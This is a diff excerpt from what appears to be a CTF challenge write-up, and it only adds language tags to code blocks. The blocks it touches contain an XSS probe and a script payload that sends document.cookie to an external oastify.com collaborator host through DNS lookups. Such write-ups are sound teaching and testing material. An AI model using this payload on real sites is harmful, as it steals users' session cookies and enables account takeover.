@@ -222,7 +222,7 @@ The first thing that comes to mind is requesting access to the private share, bu
 Can we exfiltrate somthing? Maybe cookies? Using only DNS queries? First let's see it there is the possibility of an XSS with a very simple `img` payload:
 
 
-```
+```html
 <img src=//7u2jf9m0qs3lxlmtuq9hc74am1ssgi47.oastify.com>
 ```
 
@@ -230,7 +230,7 @@ and our collaborator soon gets an hit!
 
 This was the payload I used when I first tried the challenge:
 
-```
+```javascript
 <script>document.write('<img src=//'+document.cookie.replace(/=/,'.')+'.ovn0gqnhr942y2nav7aydo5rnit9h05p.oastify.com>')</script>
 ```
 
